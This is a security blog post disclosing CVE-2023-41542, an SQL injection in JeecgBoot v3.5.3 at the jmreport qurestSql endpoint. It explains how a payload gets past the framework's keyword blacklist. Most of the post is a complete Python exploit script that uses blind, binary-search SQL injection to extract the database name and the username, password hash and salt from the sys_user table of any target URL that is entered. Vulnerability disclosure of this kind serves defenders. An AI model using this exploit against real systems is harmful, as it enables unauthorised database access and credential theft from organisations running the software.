=== Content from pho3n1x-web.github.io_3a6b028d_20250111_004124.html ===

[**Pho3n1x**](/)

* [Home](/)
* [Archives](/archives/)
* [Categories](/categories/)
* [Tags](/tags/)
* [About](/about/)

September 15, 2023 pm

7.4k words

31 mins

# CVE-2023-41542(JeecgBoot Sql Injection)

## Description

JEECG Boot v3.5.3 was discovered to contain a SQL injection in /jeecg boot/jmreport/qurestSql

## Affected version

JeecgBoot <= v3.5.3

## Vulnerability Analysis

It was found that the framework has protected the original SQL injection by adding a blacklist. The blacklist is as follows：

“exec|peformance\_schema|information\_schema|extractvalue|updatexml|geohash|gtid\_subset|gtid\_subtract| insert | alter | delete | grant | update | drop | chr | mid | master | truncate | char | declare |user()|”;

![](/../images/image-20230915140019578.png)

Therefore, it is possible to directly construct payloads outside of the blacklist to bypass existing protective measures，As I mentioned in the report

| ``` 1 ``` | ``` 1 'having {ascii}=(nullif (ascii (substring ((select database()), {place}, 1)), 0) or' ``` |
| --- | --- |

## Exp

The complete utilization script is as follows

| ``` 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143 ``` | ``` import requestsimport jsondef get_database(url):    url=url+"/jeecg-boot/jmreport/qurestSql"    headers = {        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',        'Accept': 'application/json, text/plain, */*',        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',        'Referer': 'http://localhost:8088/jeecg-boot/jmreport/list',        'X-Access-Token': 'null',        'token': 'null',        'JmReport-Tenant-Id': 'null',        'Content-Type': 'application/json',        'Connection': 'close',        'Sec-Fetch-Dest': 'empty',        'Sec-Fetch-Mode': 'no-cors',        'Sec-Fetch-Site': 'same-origin',        'Pragma': 'no-cache',        'Cache-Control': 'no-cache'    }    # payload = """{"apiSelectId":"1316997232402231298","id":"1'   having 106=(nullif(ascii((substring((select database()),1,1))),0)) or     '"}"""    payload="""{"apiSelectId":"1316997232402231298","id":"1'   having 32<(nullif(ascii((substring((select database()),{length},1))),0)) or     '"}"""    length=1    while True:        payload=f"""{{"apiSelectId":"1316997232402231298","id":"1'   having 32<(nullif(ascii((substring((select database()),{length},1))),0)) or     '"}}"""        response=requests.post(url,headers=headers,data=payload)        res=json.loads(response.text)        if res["result"]==None:            break        else:            length+=1    database=""    for place in range(1,length):        min=32        max=128        mid=(min+max)//2        while min<max:            payload=f"""{{"apiSelectId":"1316997232402231298","id":"1'   having {mid}<(nullif(ascii((substring((select database()),{place},1))),0)) or     '"}}"""            response=requests.post(url,headers=headers,data=payload)            res=json.loads(response.text)            if res["result"]!=None:                min = mid + 1            else:                max = mid            mid = (min + max) // 2        database+=chr(mid)    print(database)def get_user_password(url):    url=url+"/jeecg-boot/jmreport/qurestSql"    headers = {        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',        'Accept': 'application/json, text/plain, */*',        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',        'Referer': 'http://localhost:8088/jeecg-boot/jmreport/list',        'X-Access-Token': 'null',        'token': 'null',        'JmReport-Tenant-Id': 'null',        'Content-Type': 'application/json',        'Connection': 'close',        'Sec-Fetch-Dest': 'empty',        'Sec-Fetch-Mode': 'no-cors',        'Sec-Fetch-Site': 'same-origin',        'Pragma': 'no-cache',        'Cache-Control': 'no-cache'    }    length=1    while True:        payload=f"""{{"apiSelectId":"1316997232402231298","id":"1'   having 32<(nullif(ascii((substring((select username from sys_user limit 1,1),{length},1))),0)) or     '"}}"""        response=requests.post(url,headers=headers,data=payload)        res=json.loads(response.text)        if res["result"]==None:            break        else:            length+=1    username=""    for place in range(1,length):        min=32        max=128        mid=(min+max)//2        while min<max:            payload=f"""{{"apiSelectId":"1316997232402231298","id":"1'   having {mid}<(nullif(ascii((substring((select username from sys_user limit 1,1),{place},1))),0)) or     '"}}"""            response=requests.post(url,headers=headers,data=payload)            res=json.loads(response.text)            if res["result"]!=None:                min = mid + 1            else:                max = mid            mid = (min + max) // 2        username+=chr(mid)    length=1    while True:        payload=f"""{{"apiSelectId":"1316997232402231298","id":"1'   having 32<(nullif(ascii((substring((select password from sys_user limit 1,1),{length},1))),0)) or     '"}}"""        response=requests.post(url,headers=headers,data=payload)        res=json.loads(response.text)        if res["result"]==None:            break        else:            length+=1    password=""    for place in range(1,length):        min=32        max=128        mid=(min+max)//2        while min<max:            payload=f"""{{"apiSelectId":"1316997232402231298","id":"1'   having {mid}<(nullif(ascii((substring((select password from sys_user limit 1,1),{place},1))),0)) or     '"}}"""            response=requests.post(url,headers=headers,data=payload)            res=json.loads(response.text)            if res["result"]!=None:                min = mid + 1            else:                max = mid            mid = (min + max) // 2        password+=chr(mid)    length=1    while True:        payload=f"""{{"apiSelectId":"1316997232402231298","id":"1'   having 32<(nullif(ascii((substring((select salt from sys_user limit 1,1),{length},1))),0)) or     '"}}"""        response=requests.post(url,headers=headers,data=payload)        res=json.loads(response.text)        if res["result"]==None:            break        else:            length+=1    salt=""    for place in range(1,length):        min=32        max=128        mid=(min+max)//2        while min<max:            payload=f"""{{"apiSelectId":"1316997232402231298","id":"1'   having {mid}<(nullif(ascii((substring((select salt from sys_user limit 1,1),{place},1))),0)) or     '"}}"""            response=requests.post(url,headers=headers,data=payload)            res=json.loads(response.text)            if res["result"]!=None:                min = mid + 1            else:                max = mid            mid = (min + max) // 2        salt+=chr(mid)    print("用户名为："+username+"\n密码为："+password+"\n盐为："+salt)# get_database("http://localhost:8088")url=input("please input your target: (example:http://localhost:8088)")# get_database(url)get_user_password(url) ``` |
| --- | --- |

---

[CVE](/categories/CVE/)

[#CVE](/tags/CVE/)
[#代码审计](/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)
[#JeecgBoot](/tags/JeecgBoot/)

CVE-2023-41542(JeecgBoot Sql Injection)
https://pho3n1x-web.github.io/2023/09/15/CVE-2023-41542(JeecgBoot\_sql)/

Author
Pho3n1x

Posted on
September 15, 2023

Licensed under
[CC BY-NC-SA 4.0](https://CREATIVECOMMONS.ORG/LICENSES/BY-NC-SA/4.0/)

[CVE-2022-22972(VM\_access\_Identity\_authentication\_bypass)
Previous](/2023/09/18/CVE-2022-22972%28VM_access_%20Identity_authentication_bypass%29/ "CVE-2022-22972(VM_access_Identity_authentication_bypass)")

[命令执行绕过
Next](/2022/07/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/ "命令执行绕过")

Table of Contents

#### Search

×

Keyword

[Hexo](https://hexo.io)  [Fluid](https://github.com/fluid-dev/hexo-theme-fluid)

Views:

Visitors:

Blog works best with JavaScript enabled


